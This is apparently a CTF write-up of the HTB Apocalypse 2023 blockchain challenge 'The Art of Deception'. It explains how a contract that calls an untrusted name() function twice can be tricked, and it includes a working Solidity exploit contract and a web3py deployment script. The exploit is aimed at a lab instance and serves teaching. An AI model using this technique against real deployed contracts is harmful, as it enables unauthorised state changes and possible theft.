---
title: "Write-up of The Art of Deception (Blockchain) CTF HTB Apocalypse 2023"
summary: "Introduction to Web3 security: an explanation of the logic put behind flagging a Web3 challenge, written in web3py and solidity."
date: 2023-03-28T15:08:45-02:00
lastUpdate: 2023-03-28T15:08:45-02:00
tags: ["web3","solidity","write-up","Supwn"]
author: Turtyo
draft: false
---

When we first start the challenge, we have two URLs as it was common on the blockchain part of this CTF:
```
68.183.37.122:31651
68.183.37.122:32646 
```

The first one is an **RPC** URL, we will use it to connect to the blockchain.   
The second is a **TCP** port, we can connect to it using `nc 68.183.37.122:32646`.

This allows us to retrieve connection information that we will need for the challenge:
```
1 - Connection information
2 - Restart Instance
3 - Get flag
action? 1

Private key     :  0xa22d64ea53f80c513cf9223d4d968d96637819568b2a81f33d070e4818a1c382
Address         :  0x23b6462992d4131BE158f20B6aEEab2Fd6887b3B
Target contract :  0xDa2FE820ae9135E877ac01aA657743B7c75Fe4bb
Setup contract  :  0x1ba407613f8d2D40b70b70d312f05F6f2628e58F
```

Of course the private key is a false one, you won't win the big prize today x)   
And the `Get flag` tells us the challenge isn't solved yet.

We also have some files that we downloaded at the start of the challenge, let's check what's inside of them:   
`Setup.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {HighSecurityGate} from "./FortifiedPerimeter.sol";

contract Setup {
    HighSecurityGate public immutable TARGET;

    constructor() {
        TARGET = new HighSecurityGate();
    }

    function isSolved() public view returns (bool) {
        return TARGET.strcmp(TARGET.lastEntrant(), "Pandora");
    }
}
```

We can for now see with the function `isSolved` that we need to verify `TARGET.lastEntrant() == "Pandora"`

`FortifiedPerimeter.sol`
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;


interface Entrant {
    function name() external returns (string memory);
}

contract HighSecurityGate {
    
    string[] private authorized = ["Orion", "Nova", "Eclipse"];
    string public lastEntrant;

    function enter() external {
        Entrant _entrant = Entrant(msg.sender);

        require(_isAuthorized(_entrant.name()), "Intruder detected");
        lastEntrant = _entrant.name();
    }

    function _isAuthorized(string memory _user) private view returns (bool){
        for (uint i; i < authorized.length; i++){
            if (strcmp(_user, authorized[i])){
                return true;
            }
        }
        return false;
    }

    function strcmp(string memory _str1, string memory _str2) public pure returns (bool){
        return keccak256(abi.encodePacked(_str1)) == keccak256(abi.encodePacked(_str2)); 
    }
}
```

Here we see multiple interesting things. First, we understand what was this "lastEntrant" thing, we have a list `authorized = ["Orion", "Nova", "Eclipse"]`. To modify the variable `lastEntrant` we need to use the function `enter` which will change the value of `lastEntrant` to match with the name of the person using the function (the entrant), after checking that the name of this entrant is indeed in `authorized`.

This `name` function is defined as an `external` function in the `Entrant` interface. In Solidity, the `external` keyword means that the function is called from outside the contract. To read more about function types, you can check the doc [here](https://docs.soliditylang.org/en/v0.8.19/types.html#function-types). Here, it is left to the person interacting with the `enter` function to implement it. In itself, this is not a vulnerability.

But the vulnerability comes in the following two lines:
```solidity
require(_isAuthorized(_entrant.name()), "Intruder detected");
lastEntrant = _entrant.name();
```

The interesting thing to note here is that the `name` function is called twice, first to check that it is an authorized name, and a second time to change the value of `lastEntrant`. And **we** are the ones that implement the `name` function ! The idea of how to flag the challenge is the following:  

***"What if we gave a name in the authorized list the first time the function is called and the name Pandora the second time ?"***

I started by writing a solidity file for this (`fake_entrant.sol`)
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;


interface Entrant {
    function name() external returns (string memory);
}

interface HighSecurityGate {
    function enter() external;
}

contract FakeEntrant is Entrant {
    bool private _hasBeenCalled = false;
    HighSecurityGate _gate;
    
    constructor(address gateAddress){
        _gate = HighSecurityGate(gateAddress);
    }

    function callEnter() public {
        _gate.enter();
    }

    function name() external override returns (string memory) {
        if (!_hasBeenCalled) {
            _hasBeenCalled = true;
            return "Orion";
        } else {
            return "Pandora";
        }
    }

}
```
The `name` function does exactly what was described above. The `callEnter` function is here to be able to ask for the `enter` function on behalf of this contract.
We can't just call the `enter` function ourselves, because we don't have the `name` function implemented.   
So instead of doing this: `us -> enter`   
We do: &emsp; &emsp; &emsp; &emsp; &emsp; &emsp; `us -> callEnter -> fake_entrant.sol -> enter`   
The `fake_entrant.sol` acts as a middle man for us.   

And here is the `web3py` code to make all of this work (`sneaking_in.py`):
```python
from web3 import Web3
from abi import *
import solcx

url = 'http://68.183.37.122:31651'
# nc 68.183.37.122 32646 

private_key     =  "0xa22d64ea53f80c513cf9223d4d968d96637819568b2a81f33d070e4818a1c382" # this is a false one btw
address         =  "0x23b6462992d4131BE158f20B6aEEab2Fd6887b3B"
target_contract =  "0xDa2FE820ae9135E877ac01aA657743B7c75Fe4bb"
setup_contract  =  "0x1ba407613f8d2D40b70b70d312f05F6f2628e58F"

w3 = Web3(Web3.HTTPProvider(url))
print('[+] Connection successful' if w3.is_connected() else '[-] Connection failed')

contract_fortified_perimeter = w3.eth.contract(target_contract, abi = abi_fortified_perimeter)
contract_setup = w3.eth.contract(setup_contract, abi = abi_setup)

# Compile the contract
comp = solcx.compile_files("./fake_entrant.sol", output_values=["abi", "bin"])['fake_entrant.sol:FakeEntrant']

# Deploy the contract
contract_fake_entrant = w3.eth.contract(abi=comp['abi'], bytecode=comp['bin'])
tx_hash = contract_fake_entrant.constructor(target_contract).transact()
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
contract_fake_entrant_address = tx_receipt.contractAddress
new_contract_fake_entrant = w3.eth.contract(abi=comp['abi'],address=tx_receipt.contractAddress)

# print(f'Receipt : {tx_receipt}')
print(f'Contract address : {contract_fake_entrant_address}')

print("Calling the enter function")
new_contract_fake_entrant.functions.callEnter().transact()

print(f'lastEntrant = {contract_fortified_perimeter.functions.lastEntrant().call()}')
print(f'isSolved = {contract_setup.functions.isSolved().call()}')

# goal is to make last entrant as "Pandora"
```
After that we just need to `nc 68.183.37.122:32646` and get the flag !

Few things to note here:
- I used [__Remix__](https://remix.ethereum.org/) (an online tool) to compile the `FortifiedPerimeter.sol` and `Setup.sol` files in order to get their ABI (that's basically a list of the functions and attributes of the contracts in the file)
- [solcx](https://pypi.org/project/py-solc-x/) is a python interface to use the [solc compiler](https://docs.soliditylang.org/en/latest/installing-solidity.html#building-from-source)
- I am still unsure as to why I had to recreate the contract using the address of the contract. I thought it would already be in the blockchain when I used the constructor, but it seems that the local instance is separated from the online instance of the contract.

Also if you just started working with web3 (as I did before this CTF), the difference between `call` and `transact` functions is that `call` is a read only function (meaning you look at the state of what you are calling) whereas `transact` is used to make a change.

I hope this WU was clear, thank you for reading through it.

Turtyo for the Supwn team
